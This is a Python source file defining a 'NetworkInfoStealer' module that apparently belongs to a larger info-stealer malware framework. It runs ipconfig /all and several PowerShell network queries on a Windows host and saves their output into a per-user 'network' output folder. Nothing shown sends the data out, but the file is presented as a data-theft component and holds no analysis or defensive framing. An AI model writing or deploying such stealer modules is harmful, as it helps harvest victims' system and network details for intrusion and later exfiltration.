import os
import subprocess

from config import ModuleManager


class NetworkInfoStealer(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "NetworkInfoStealer")

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'network')
        self.ipconfig_filename = os.path.join(self.systeminfo_folder, 'ipconfig.txt')
        self.ipconfiguration_filename = os.path.join(self.systeminfo_folder, 'ipconfiguration.txt')
        self.physical_adapters_filename = os.path.join(self.systeminfo_folder, 'physical_adapters.txt')
        self.getnet_ipconfig_filename = os.path.join(self.systeminfo_folder, 'getnet_ipinfo.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
            
    def ipconfig(self) -> None:
        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace")
        with open(self.ipconfig_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def ipconfiguration(self)   -> None:
        data = subprocess.check_output(['powershell', 'get-wmiobject Win32_NetworkAdapterConfiguration']).decode('utf-8', errors="backslashreplace")
        with open(self.ipconfiguration_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
        
    def physical_adapters(self)   -> None:
        data = subprocess.check_output(['powershell', "Get-NetAdapter -physical| where status -eq 'up'"]).decode('utf-8', errors="backslashreplace")
        with open(self.physical_adapters_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def getnet_ipconfig(self)   -> None:
        data = subprocess.check_output(['powershell', "Get-NetIPConfiguration -All"]).decode('utf-8', errors="backslashreplace")
        with open(self.getnet_ipconfig_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def run(self) -> None:
        self.ipconfig()
        self.ipconfiguration()
        self.physical_adapters()
        self.getnet_ipconfig()
        
        